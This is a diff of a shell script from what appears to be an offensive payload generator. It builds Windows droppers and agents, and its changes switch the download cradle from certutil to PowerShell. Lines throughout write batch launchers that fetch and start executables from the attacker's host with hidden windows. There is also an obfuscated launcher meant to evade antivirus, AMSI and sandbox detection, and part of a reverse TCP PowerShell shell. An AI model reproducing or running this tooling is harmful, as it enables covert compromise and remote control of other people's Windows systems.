@@ -10069,6 +10222,11 @@ lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --wid
 N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
 Targ=$(zenity --list --title "☠ CHOSE TARGET SYSTEM ☠" --text "chose target system .." --radiolist --column "Pick" --column "Option" TRUE "WINDOWS" FALSE "MAC OS x" --width 305 --height 100) > /dev/null 2>&1
 
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
+if [ -z "$Targ" ]; then Targ="WINDOWS";fi
 
   # config rigth arch (payload+format)
   if [ "$Targ" = "WINDOWS" ]; then
@@ -10350,6 +10508,11 @@ lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --wid
 N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
 
 
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
+
 # display final settings to user
 cat << !
 
@@ -10577,6 +10740,10 @@ paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable 
 N4m=$(zenity --entry --title "☠ DOCUMENT NAME ☠" --text "Enter document output name\nexample: office" --width 300) > /dev/null 2>&1
 sleep 1
 
+
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$N4m" ]; then N4m="office";fi
 
 # display final settings to user
 cat << !
@@ -10817,7 +10984,7 @@ fi
 sh_certutil () {
 
 # chose to use venom to build the payload or input your own binary.exe
-chose=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "This module takes advantage of certutil.exe '-urlcache'\ndisclosed by @subTee to remote download/exec agent,\n'Using certutil as one alternative way to powershell IEX()'\n\nThis module builds one agent.bat (psh-cmd) OR\nasks for the full path of the agent.exe to be used" --radiolist --column "Pick" --column "Option" TRUE "Build venom agent.bat" FALSE "The full path of your agent.exe" --width 350 --height 270) > /dev/null 2>&1
+chose=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "This module takes advantage of powershell DownloadFile() to remote download/exec agent.\n\nThis module builds one agent.bat (psh-cmd) OR\nasks for the full path of the agent.exe to be used" --radiolist --column "Pick" --column "Option" TRUE "Build venom agent.bat" FALSE "The full path of your agent.exe" --width 350 --height 270) > /dev/null 2>&1
 if [ "$?" -eq "0" ]; then
 
 # get user input to build shellcode
@@ -10831,6 +10998,13 @@ paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable 
 N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: shellcode" --width 300) > /dev/null 2>&1
 # input payload (agent) remote upload directory
 D1r=$(zenity --title="☠ Enter remote upload dir ☠" --text "The remote directory where to upload agent.\nWARNING:chose allways rewritable directorys\nWARNING:Use only Windows Enviroment Variables\n\nexample: %tmp%" --entry --width 330) > /dev/null 2>&1
+
+
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
+if [ -z "$D1r" ]; then D1r="%tmp%";fi
 
 #
 # check if remote path was inputed correctlly (only enviroment variables accepted)
@@ -10846,7 +11020,7 @@ fi
 
 
 
-echo "[☠] Loading certutil appl_whitelisting_bypass"
+echo "[☠] Loading powershell DownloadFile()"
 sleep 1
 if [ "$chose" = "Build venom agent.bat" ]; then
 echo "[☠] Building shellcode -> psh-cmd format ..."
@@ -10866,9 +11040,7 @@ cat << !
     | LHOST   : $lhost
     | FORMAT  : PSH-CMD -> WINDOWS(bat)
     | PAYLOAD : $paylo
-    | AGENT   : $IPATH/output/$N4m.bat
-    | VULN    : certutil - Application_whitelisting_bypass
-    |_DISCLOSURE : @subTee
+    |_AGENT   : $IPATH/output/$N4m.bat
 
 !
 
@@ -10918,7 +11090,7 @@ echo "[☠] Injecting shellcode into: $N4m.bat"
 sleep 2
 OBF=$(zenity --list --title "☠ AGENT STRING OBFUSCATION ☠" --text "Obfuscate the agent [ template ] command arguments ?\nUsing special escape characters, whitespaces, concaternation, amsi\nsandbox evasion and variables piped and de-obfuscated at runtime\n'The agent will delay 3 sec is execution to evade sandbox detection'" --radiolist --column "Pick" --column "Option" TRUE "None-Obfuscation (default)" FALSE "String Obfuscation (3 sec)" --width 353 --height 245) > /dev/null 2>&1
 if [ "$OBF" = "None-Obfuscation (default)" ]; then
-echo "@echo off&&cmd.exe /c powershell.exe -nop -exec bypass -wind hidden -noni -enc $disp" > $N4m.bat
+echo "@echo off&&cmd.exe /c powershell.exe -nop -exec bypass -w 1 -noni -enc $disp" > $N4m.bat
 else
 echo "[✔] String obfuscation technic sellected .."
 # OBFUSCATE SYSCALLS (evade AV/AMSI + SandBox Detection)
@@ -10948,9 +11120,7 @@ cat << !
     | LHOST   : $lhost
     | FORMAT  : EXE -> WINDOWS(exe)
     | PAYLOAD : $paylo
-    | BINARY  : $UpL
-    | VULN    : certutil - Applications_whitelisting_bypass
-    |_DISCLOSURE : @subTee
+    |_BINARY  : $UpL
 
 !
 
@@ -11260,6 +11430,13 @@ target=$(zenity --title="☠ Enter RHOST (target ip) ☠" --text "example: 192.1
 N4m=$(zenity --title="☠ Enter Dropper FileName ☠" --text "example: dropper" --entry --width 300) > /dev/null 2>&1
 slave=$(zenity --title="☠ Enter Payload FileName ☠" --text "example: icmpsh\nRemark: DONT start the name with [ f ] character .." --entry --width 300) > /dev/null 2>&1
 rpath=$(zenity --title="☠ Enter Upload Path (target dir) ☠" --text "example: %tmp%\nexample: %userprofile%\\\\\\\Desktop" --entry --width 350) > /dev/null 2>&1
+
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$N4m" ]; then N4m="dropper";fi
+if [ -z "$rpath" ]; then rpath="%tmp%";fi
+if [ -z "$slave" ]; then slave="icmpsh";fi
+if [ -z "$target" ]; then echo "${RedF}[x]${white} This Module Requires Target ip addr input";sleep 3; sh_exit;fi
 
 ## setting default values in case user have skip this ..
 if [ -z "$target" ]; then
@@ -11768,7 +11945,7 @@ cat << !
     | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
     | LOLBin             : WinHttpRequest
     | AGENT EXTENSION    : PS1
-    | DROPPER EXTENSION  : PS1
+    |_DROPPER EXTENSION  : PS1
 
     AGENT Nº2
     ╔──────────────────────────────────────────────────────────────
@@ -11776,15 +11953,7 @@ cat << !
     | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
     | LOLBin             : Powershell (Net.WebClient)
     | AGENT EXTENSION    : EXE|PY
-    | DROPPER EXTENSION  : BAT|--
-
-    AGENT Nº3:
-    ╔──────────────────────────────────────────────────────────────
-    | DESCRIPTION        : Reverse TCP Powershell Shell
-    | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
-    | LOLBin             : certutil|WinHttpRequest
-    | AGENT EXTENSION    : PS1
-    | DROPPER EXTENSION  : BAT
+    |_DROPPER EXTENSION  : BAT|--
 
     ╔─────────────────────────────────────────────────────────────╗
     ║   M    - Return to main menu                                ║
@@ -11860,7 +12029,7 @@ echo "\$socket = new-object \$PSArgException('$lhost', $lport);if(\$socket -eq \
 echo "\$writer = new-object System.IO.\$icmpv6(\$stream);\$buffer = new-object System.Byte[] 1024;" >> $IPATH/output/$NaM.ps1
 echo "\$comm = new-object \$NewObjectCommand;" >> $IPATH/output/$NaM.ps1
 echo "do{" >> $IPATH/output/$NaM.ps1
-echo "	\$writer.Write(\"> \");" >> $IPATH/output/$NaM.ps1
+echo "	\$writer.Write(\"prompt> \");" >> $IPATH/output/$NaM.ps1
 echo "	\$writer.Flush();" >> $IPATH/output/$NaM.ps1
 echo "	\$read = \$null;" >> $IPATH/output/$NaM.ps1
 echo "	while(\$stream.DataAvailable -or (\$read = \$stream.Read(\$buffer, 0, 1024)) -eq \$null){};" >> $IPATH/output/$NaM.ps1
@@ -11928,13 +12097,18 @@ lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --wid
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 NaM=$(zenity --title="☠ Enter FILENAME ☠" --text "example: notepad" --entry --width 300) > /dev/null 2>&1
 
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$NaM" ]; then NaM="notepad";fi
+
 ## display final settings to user
 echo "${BlueF}[${YellowF}i${BlueF}]${white} MODULE SETTINGS"${Reset};
 echo "${BlueF}---"
 cat << !
     LPORT    : $lport
     LHOST    : $lhost
-    LOLBin   : certutil
+    LOLBin   : powershell DownloadFile()
     DROPPER  : $IPATH/output/$NaM.bat
     AGENT    : $IPATH/output/$NaM.exe
 !
@@ -11945,7 +12119,7 @@ echo "---${white}"
 echo "${BlueF}[☠]${white} Building Obfuscated bat Launcher .."${Reset};sleep 2
 echo "@echo off" > $IPATH/output/Launcher.bat
 echo "echo Please Wait, Installing Software .." >> $IPATH/output/Launcher.bat
-echo "certutil.exe -urlcache -split -f http://$lhost/$NaM.exe $NaM.exe && start $NaM.exe" >> $IPATH/output/Launcher.bat
+echo "powershell -win 1 -C (New-Object Net.WebClient).DownloadFile('https://$lhost/$NaM.exe', '$NaM.exe') && Start $NaM.exe" >> $IPATH/output/Launcher.bat
 echo "exit" >> $IPATH/output/Launcher.bat
 cd $IPATH/output
 mv Launcher.bat $NaM.bat
@@ -12085,13 +12259,19 @@ lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --wid
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 NaM=$(zenity --title="☠ Enter FILENAME ☠" --text "example: notepad" --entry --width 300) > /dev/null 2>&1
 
+
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$NaM" ]; then NaM="notepad";fi
+
 ## display final settings to user
 echo "${BlueF}[${YellowF}i${BlueF}]${white} MODULE SETTINGS"${Reset};
 echo ${BlueF}"---"
 cat << !
     LPORT    : $lport
     LHOST    : $lhost
-    LOLBin   : certutil
+    LOLBin   : powershell DownloadFile()
     DROPPER  : $IPATH/output/$NaM.bat
     AGENT    : $IPATH/output/$NaM.ps1
 !
@@ -12144,7 +12324,9 @@ echo "${BlueF}[☠]${white} Building Obfuscated bat Launcher .."${Reset};sleep 2
 # echo "@echo off&&certutil.exe -urlcache -split -f http://$lhost/$NaM.ps1 $NaM.ps1 && start $NaM.ps1" > $IPATH/output/$NaM.bat
 # $proxy=new-object -com WinHttp.WinHttpRequest.5.1;$proxy.open('GET','http://$lhost/$NaM.ps1',$false);$proxy.send();powershell -C "[char]73+[char]69+[char]88";$proxy.responseText;Start-Process -FilePath "./$NaM.ps1" -Wait -WindowStyle Minimized
 ## Obfuscated bat launcher
-echo "@e%!%ch^O ,;, Of^f&&(,(,, (,;sEt i0=f&&sEt T0=$splt1&&sEt NULL=$splt2&&@e%!%ch^O please wait, installing software.&&@cErt^uT%OKEN%il.ex%HUB%e -u%TOKEN%rl%char[0..3]%ca%F%che -sp%d0b%lit -%i0% http://%T0%.%NULL%/$NaM.ps1 $NaM.ps1),) %i% ,,)&&(,(; st%db%art $NaM.ps1), %char[0..5]%)&&eXit" > $IPATH/output/$NaM.bat
+echo "@e%!%ch^O ,;, Of^f&&(,(,, =power%i0%shell -w 1 -C (New-Object Net.WebClient).Down%buffer%loadString('http://$lhost/$NaM.ps1')), %i%)" > $IPATH/output/$NaM.bat
+
+
 
 
 ## Copy files to apache2 webroot
